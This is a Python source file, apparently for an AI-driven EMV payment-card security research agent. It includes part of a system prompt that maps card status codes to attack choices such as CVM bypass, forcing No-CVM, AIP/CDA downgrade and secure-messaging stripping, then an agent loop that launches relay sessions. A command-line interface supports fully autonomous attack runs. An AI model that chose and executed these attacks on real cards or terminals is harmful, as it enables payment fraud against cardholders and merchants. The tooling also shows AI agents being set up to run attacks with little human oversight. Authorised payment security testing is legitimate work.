| 6983   | security_condition | Authentication method blocked / PIN tries exhausted  | Avoid PIN attacks; use ATTACK-4 |
| 6984   | security_condition | Referenced data not usable (key/cert mismatch)       | AIP downgrade (ATTACK-3) first  |
| 6985   | security_condition | Conditions of use not satisfied (CVM/policy check)   | Downgrade before CVM bypass     |
| 6986   | security_condition | Command not allowed (no current EF selected)         | Check AFL manipulation side-fx  |
| 6988   | security_condition | Incorrect secure messaging data                      | SM stripping attack relevant    |
| 69xx   | interesting        | Generic command not allowed                          | Investigate command context     |
| 6Axx   | interesting        | Wrong P1/P2 or file not found                        | Mutation affected addressing    |
| 6Dxx   | interesting        | Instruction not supported (after mutation)           | Mutation changed INS handling   |
| 6Fxx   | interesting        | No precise diagnosis (card internal error)           | Possible firmware bug trigger   |

### How to use outcome patterns
1. Call query_mutation_outcomes(fingerprint_hash=<hash>) after load_card_intel.
2. Check sw_patterns: which SW codes appeared on which INS bytes?
3. Adjust attack plan:
   - 6985 on AE (GENERATE AC) → card caught CVM/crypto manipulation → run ATTACK-3 first to
     downgrade CDA/DDA, then retry CVM bypass. The recommended list already accounts for this.
   - 6984 on A8 (GPO) → card rejected PDOL data → try ATTACK-2 (TTQ) instead of ATTACK-1.
   - security_condition count ≥ 3 → card is sensitive to mutations → start with ATTACK-5
     (silent data collection only) to baseline before active mutations.
   - 6983 on VERIFY (INS 20/21) → PIN counter exhausted or auth blocked → skip PIN-based CVM,
     use ATTACK-4 (force No-CVM) directly.
4. For a new engagement context, call query_mutation_outcomes(cross_card=true) to see global
   SW patterns across all previously tested cards — helps predict what a new card might do.

### Manual outcome marking (from UI)
Operators can click the ★ button on any Live Trace row to mark it as 'manual_interesting'.
These manual marks appear in outcome_summary with source='manual' and carry higher signal
than auto-recorded outcomes. Prioritise 'manual_interesting' patterns in your analysis.

Be concise in operator-facing output. When a transaction completes, explain exactly
which mutations fired, what the card/terminal saw, and what the security implication is.
"""

# ─────────────────────────────────────────────────────────────────────────────
# Agent loop
# ─────────────────────────────────────────────────────────────────────────────

def _broadcast(event: dict) -> None:
    try:
        from api.ws.agent_stream import broadcast_agent_event
        broadcast_agent_event(event)
    except Exception:
        pass


def _print_text(text: str) -> None:
    print("\n\033[1;36m[Agent]\033[0m", text)
    _broadcast({"type": "text", "text": text})


def _print_tool_call(name: str, args: dict) -> None:
    args_short = json.dumps(args, separators=(",", ":"))
    if len(args_short) > 120:
        args_short = args_short[:117] + "..."
    print(f"\n\033[1;33m[Tool →]\033[0m {name}({args_short})")
    _broadcast({"type": "tool", "name": name, "input": args})


def _print_tool_result(name: str, result: dict) -> None:
    result_short = json.dumps(result, separators=(",", ":"))
    if len(result_short) > 200:
        result_short = result_short[:197] + "..."
    print(f"\033[1;32m[Tool ←]\033[0m {name}: {result_short}")


def run_agent(
    reader_index: int,
    model: str,
    brute_sfi: bool,
    provider: str | None = None,
    task: str | None = None,
    task_file: str | None = None,
    non_interactive: bool = False,
    system_extra: str | None = None,
    stop_event=None,          # threading.Event | None — set to interrupt the loop
) -> None:
    # Resolve the back end (Claude, OpenAI, a local OpenAI-compatible server,
    # or nothing).  ProviderUnavailable carries operator-facing setup guidance.
    try:
        llm: Provider = resolve_provider(provider, model)
    except ProviderUnavailable as exc:
        print(f"\n\033[1;33m[Agent unavailable]\033[0m {exc}")
        _broadcast({"type": "error", "message": str(exc)})
        raise

    # Build initial user message
    if task_file:
        try:
            task = Path(task_file).read_text(encoding="utf-8").strip()
        except OSError as e:
            sys.exit(f"Cannot read task file: {e}")

    if task:
        initial_content = (
            f"Reader index: {reader_index}. "
            f"Brute-force off-AFL SFIs: {brute_sfi}.\n\n"
            f"{task}"
        )
    else:
        initial_content = (
            f"Start the EMV security research session. "
            f"Reader index: {reader_index}. "
            f"Brute-force off-AFL SFIs: {brute_sfi}. "
            "Fingerprint the card first, then reason about the best attack "
            "combination, configure it, and launch the relay session."
        )


    # Optionally extend the system prompt with operator-supplied context
    system = SYSTEM_PROMPT
    if system_extra:
        system = (
            SYSTEM_PROMPT
            + "\n\n─────────────────────────────────────────────────────────────────────────────"
            + "\n## OPERATOR CONTEXT (provided at session start)\n\n"
            + system_extra.strip()
        )

    print("\033[1;35m═══ EMV Security Research Agent ═══\033[0m")
    print(f"Model: {llm.describe()}   Reader: {reader_index}", end="")
    if non_interactive:
        print("   [non-interactive]", end="")
    if task:
        print(f"\nTask: {task[:80]}{'...' if len(task) > 80 else ''}", end="")
    print()
    if not non_interactive:
        print("Type your messages after [You]. Ctrl-C to exit.")
    print()

    llm.begin(system, initial_content)

    # In non-interactive mode we send one automatic "done" to let the agent
    # wrap up after it asks the operator to present the card, then exit on
    # the next end_turn.
    _auto_done_sent = False

    while True:
        if stop_event is not None and stop_event.is_set():
            print("\n[Agent stopped by external request]")
            _broadcast({"type": "done"})
            break

        try:
            turn = llm.complete(TOOLS, max_tokens=4096)
        except ProviderError as e:
            print(f"\n\033[1;31m[API Error]\033[0m {e}")
            _broadcast({"type": "error", "message": str(e)})
            break

        # Print any narration before running the tools it asked for
        if turn.text.strip():
            _print_text(turn.text)

        if turn.wants_tools:
            # The provider has already recorded its own assistant turn; we only
            # need to hand back the results, keyed by tool-call id.
            tool_results = []
            for tc in turn.tool_calls:
                _print_tool_call(tc.name, tc.input)
                fn = _TOOL_FNS.get(tc.name)
                if fn:
                    try:
                        result = fn(tc.input)
                    except Exception as e:
                        result = {"error": str(e)}
                else:
                    result = {"error": f"unknown tool: {tc.name}"}
                _print_tool_result(tc.name, result)
                tool_results.append((tc.id, result))

            llm.add_tool_results(tool_results)

        elif turn.stop_reason in ("end_turn", "stop", ""):
            if non_interactive:
                if not _auto_done_sent:
                    # First end_turn: agent is waiting for the operator to
                    # present the card. Poll for activity before signalling done
                    # so we don't give up before the first transaction completes.
                    _auto_done_sent = True
                    _wait_for_transaction_activity(timeout=90, poll=3)
                    print("\033[2m[auto] done\033[0m")
                    llm.add_user("done")
                else:
                    # Second end_turn: agent has wrapped up; exit.
                    print("\n[Session complete — non-interactive mode]")
                    _broadcast({"type": "done"})
                    break
                continue

            # Interactive mode: ask operator for input
            print()
            try:
                user_input = input("\033[1;37m[You]\033[0m ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[Session ended]")
                _broadcast({"type": "done"})
                break

            if not user_input:
                continue
            if user_input.lower() in {"exit", "quit", "q"}:
                print("[Session ended]")
                _broadcast({"type": "done"})
                break

            llm.add_user(user_input)

        else:
            # max_tokens or other stop reason
            print(f"\n[stop_reason={turn.stop_reason}]")
            break

    # Clean up relay process on exit
    global _relay_process
    if _relay_process and _relay_process.poll() is None:
        print("[Stopping relay session...]")
        _relay_process.terminate()


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Claude-powered EMV security research orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Default interactive session
  python3 emv_agent.py --reader 2

  # Give Claude a specific goal up front
  python3 emv_agent.py --reader 2 --task "focus on COMBO-C; skip other attacks"

  # Load a multi-line task script from a file
  python3 emv_agent.py --reader 2 --task-file tasks/visa_relay.txt

  # Add context to the system prompt without changing the task
  python3 emv_agent.py --reader 2 --system-extra "Terminal: Ingenico iCT250, EMV kernel 3.1. Card population: Visa Debit UK."

  # Run fully autonomously (no interactive prompts)
  python3 emv_agent.py --reader 2 --task "run silent data collection only" --non-interactive

  # Combine flags
  python3 emv_agent.py --reader 2 --brute-sfi --model claude-opus-4-7 \\
      --task "the card refused ATTACK-1 last time; try COMBO-C and ATTACK-7" \\
      --system-extra "Floor limit is EUR 50. Terminal is offline-capable."
""",
    )
    parser.add_argument(
        "--reader", "-r", type=int, default=0,
        help="PC/SC reader index (default 0)"
    )
    parser.add_argument(
        "--model", "-m", default=None,
        help=(
            "Model id. Defaults to the provider's default, or $ATRIUM_LLM_MODEL. "
            "Examples: claude-sonnet-4-6, gpt-4o, qwen2.5:14b"
        ),
    )
    parser.add_argument(
        "--provider", "-P", default=None,
        choices=["anthropic", "openai", "local"],
        help=(
            "Model back end. Auto-detected from the environment when omitted: "
            "ANTHROPIC_API_KEY -> anthropic, OPENAI_API_KEY -> openai, "
            "ATRIUM_LLM_BASE_URL -> local."
        ),
    )
    parser.add_argument(
        "--brute-sfi", action="store_true",
        help="Brute-force off-AFL SFIs during fingerprinting"
    )
    parser.add_argument(
        "--task", "-t", default=None, metavar="TEXT",
        help=(
            "Custom instruction for the agent. Replaces the default "
            "'fingerprint and attack' opening message. "
            "Example: --task \"run ATTACK-7 only, skip other mutations\""
        ),
    )
    parser.add_argument(
        "--task-file", default=None, metavar="FILE",
        help=(
            "Path to a plain-text file whose contents are used as the task. "
            "Useful for longer or reusable research scripts."
        ),
    )
    parser.add_argument(
        "--non-interactive", "--auto", action="store_true",
        help=(
            "Run without interactive prompts. The agent completes the task "
            "autonomously; 'done' is sent automatically after the relay "
            "session so the agent can record results and exit."
        ),
    )
    parser.add_argument(
        "--system-extra", default=None, metavar="TEXT",
        help=(
            "Extra context appended to the system prompt. Use this to pass "
            "session-specific information such as terminal model, card "
            "population notes, or floor limits without changing the task. "
            "Example: --system-extra \"Terminal: Ingenico iCT250. Floor limit EUR 50.\""
        ),
    )
    args = parser.parse_args()

    try:
        _preflight = resolve_provider(args.provider, args.model)
        del _preflight
    except ProviderUnavailable as exc:
        sys.exit(f"\n{exc}\n")

    run_agent(
        reader_index=args.reader,
        provider=args.provider,
        model=args.model,
        brute_sfi=args.brute_sfi,
        task=args.task,
        task_file=args.task_file,
        non_interactive=args.non_interactive,
        system_extra=args.system_extra,
    )


if __name__ == "__main__":
    main()
